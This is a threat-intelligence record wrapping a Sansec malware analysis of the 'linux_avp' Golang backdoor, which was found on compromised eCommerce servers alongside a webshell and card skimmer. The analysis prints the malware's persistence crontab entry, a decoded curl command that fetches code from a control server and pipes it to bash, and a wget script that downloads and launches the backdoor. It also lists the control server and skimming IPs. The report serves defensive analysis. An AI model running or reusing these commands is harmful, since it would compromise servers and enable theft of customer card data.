{
    "id": "ad74f436-d2f0-433a-b59e-3a9721c1d96a",
    "created_at": "2023-01-12T14:59:08.075008Z",
    "updated_at": "2025-03-27T02:14:34.101078Z",
    "deleted_at": null,
    "sha1_hash": "32b5d9e6798ecac9e287a11cdc7b6e261317f661",
    "title": "2021-11-18 - Linux malware agent hits eCommerce sites",
    "authors": "",
    "file_creation_date": "2022-05-28T23:18:06Z",
    "file_modification_date": "2022-05-28T23:18:06Z",
    "file_size": 2235329,
    "plain_text": "# New linux_avp malware hits eCommerce sites\n\n**sansec.io/research/ecommerce-malware-linux-avp**\n\n18th November 2021\n\n[Web Skimming / Sansec Threat Research](https://sansec.io/research)\nLearn about new eCommerce hacks?\n\n\nNovember 18, 2021\n\n\nReceive an alert whenever we discover new hacks or vulnerabilities that may affect\nyour online store.\n\nWhat is\n\nMagecart?\n\nAlso known as digital skimming, this crime has surged since 2015. Criminals steal\ncard data during online shopping. Who are behind these notorious hacks, how does it\nwork, and how have Magecart attacks evolved over time?\n\n[About Magecart](https://sansec.io/what-is-magecart)\n\n**Sansec discovered a new malicious agent “linux_avp” that hides as system process**\n**on eCommerce servers. It is being deployed around the world since last week and**\n**takes commands from a control server in Beijing.**\n\nA merchant recently reached out to us, after hiring two forensic companies but still having\nmalware on his store. As we appreciate a challenge, our team got started and quickly\ndiscovered an intricate attack.\n\n## Malicious Golang server agent\n\n\n-----\n\nWe found that the attacker started with automated eCommerce attack probes, testing for\ndozens of weaknesses in common online store platforms. After a day and a half, the\nattacker found a file upload vulnerability in one of the store’s plugins. S/he then uploaded a\nwebshell and modified the server code to intercept customer data.\n\nInterestingly, the attacker also uploaded a Linux executable called `linux_avp . This`\nGolang program starts, removes itself from disk, and disguises as a fake `ps -ef process.`\n\nAnalysis of `linux_avp suggests that it serves as backdoor, waiting for commands from a`\nBeijing (Alibaba) hosted server `47.113.202.35 . Note the spelling error` `PostDecript in`\nthe malware function list:\n```\nmain.BytesToPublicKey\nmain.(*client).getJob\nmain.(*client).getJob.func1\nmain.(*client).MakeCryptPostData\nmain.(*client).PostDecript\nmain.(*client).postRequest\nmain.(*client).register_cli\nmain.(*client).returnHash\nmain.CorrectPub64\nmain.DecryptOAEP\nmain.DecryptOAEPLong\nmain.DownloadFile\nmain.EncryptOAEP\nmain.EncryptOAEPLong\nmain.execute\nmain.GenerateKeyPair\nmain.JsonToDict\nmain.map2json\nmain.newClient\nmain.PubFrom64\nmain.PublicKeyToBytes\nmain.PublicKeyToStr\nmain.SetProcessName\nmain.wsock\n\n```\nThe backdoor also revealed where the backdoor was built: by user `dob in a project folder`\n```\nlin_avp, using code name GREECE .\n/home/dob/Documents/GREECE/lin_avp/lin_avp.go\n/home/dob/Documents/GREECE/lin_avp/rsa_pac.go\n/home/dob/Documents/GREECE/lin_avp/websock_pac.go\n\n```\nThe `linux_avp malware also injects a malicious crontab entry, to ensure access in case`\nthat the process is removed or the server rebooted.\n```\n* * * * * /bin/bash -c \"base64 --decode <<<\nY3VybCAtWCBQT1NUIC1kICJoYXNoPTNjMjM1YTJjY2Q3ZGI3Mzk3ZDMyNGI4ZjhiZTBlZGJhIiAtLWluc2Vjd\n | /bin/bash\"\n\n```\n\n-----\n\nThis translates to :\n```\ncurl -X POST -d \"hash=f6ee7f366f96456277fd9e10c07d9d3f\" --insecure\nhttps://47.113.202.35/license_validation_expiration | base64 --decode | /bin/bash\n\n```\nWhen executed, it will receive this code:\n```\npath_wr=$(find / -type d -writable -print | grep -wv '^/proc\\|^/dev\\|^/run' m1);wget -O $path_wr/linux_avp --post-data 'hash=f6ee7f366f96456277fd9e10c07d9d3f'\nhttps://47.113.202.35/license_validation --no-check-certificate;chmod +x\n$path_wr/linux_avp;echo\n'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQktEQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FSVUFNSUlC\n > $path_wr/xpnjdfx.txt;echo \"anonymous\" > drgjghsaef.txt; $path_wr/linux_avp &\n\n```\nThis effectively downloads the Golang malware executable to a random writable directory,\nand installs two configuration files. One contains a public key, which is presumably used to\nensure that no-one but the malware owner can launch commands.\n```\n-----BEGIN PUBLIC KEY----MIIBKDANBgkqhkiG9w0BAQEFAAOCARUAMIIBEAKCAQcA8KzigHDnHkwuLFQbjmx2\nRwnb0Mq+TPORlZP55vN7lYXxzrUaWiT1kaug6+OSN6TUAfh0a50faFgRhNIqbbGk\npuMDfO3w7CVXUlzDB05UDGiG2jtBPUNxcyDOw6v/Q5JhOAlR6uxyjgpgFwcu6XHv\nRS3OI3O19cFrz6VjrW8CTJKSN8cyTkMiLCj513uIP7XB03Dw3SdKwuDLDyteRRmI\nOYkgdrdfNvMQPkBpBsUeh0W6wKuIyjMfeGR0pPM/VLNyL2YhIvM9IvQIFlK0MujT\n8LCH3z3py9nZ0BmLSgpz1LN4/5IILBWi+WSvp/naKmi54NqZL2Y4/NEeSV91zGp/\nGxqt2aXAXQIDAQAB\n-----END PUBLIC KEY----\n```\nThis case has another Chinese connection. A file was added to the eCommerce platform\ncode called `app/design/frontend/favicon_absolute_top.jpg, which contains PHP`\ncode to retrieve a fake payment form and inject it in the store:\n```\nhttps://103.233.11.28/jQuery_StXlFiisxCDN.php?\nhash=06d08a204bddfebe2858408a62c742e944824164\n\n```\nThe IP `103.233.11.28 is hosted in Hong Kong and we previously observed it as`\nskimming exfiltration endpoint in July and August of this year.\n\n## Malware under the radar but spreading\n\n\n-----\n\nAt the time of writing, [no other anti-virus vendor recognize this malware. Curiously, one](https://www.virustotal.com/gui/file/2d422affb9727b71b0e1610568bea8643892d99bdaed99269a10e7554c88437b/detection)\n[individual had submitted the same malware to Virustotal on Oct 8th with the comment “test”.](https://www.virustotal.com/gui/file/2d422affb9727b71b0e1610568bea8643892d99bdaed99269a10e7554c88437b/details)\nThis was just one day after the successful breach of our customer’s store. The person\nuploading the malware could very well be the malware author, who wanted to assert that\ncommon anti-virus engines will not detect their creation.\n\nSansec has updated detection capabilities for our eComscan security monitor, and the\nmalware was discovered on several US and EU based servers.\n\n**Update 2021-11-25: see also our analysis of another, more advanced RAT we found a few**\ndays later: [CronRAT.](https://sansec.io/research/cronrat)\n\n_Photo by:_ _[Jeremy Bezanger](https://twitter.com/jeremybezanger)_\n\n[data-size=\"large\" > Follow @sansecio](https://twitter.com/sansecio)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-18 - Linux malware agent hits eCommerce sites.pdf"
    ],
    "report_names": [
        "2021-11-18 - Linux malware agent hits eCommerce sites.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535548,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653779886,
    "ts_modification_date": 1653779886,
    "files": {
        "pdf": "https://archive.orkl.eu/32b5d9e6798ecac9e287a11cdc7b6e261317f661.pdf",
        "text": "https://archive.orkl.eu/32b5d9e6798ecac9e287a11cdc7b6e261317f661.txt",
        "img": "https://archive.orkl.eu/32b5d9e6798ecac9e287a11cdc7b6e261317f661.jpg"
    }
}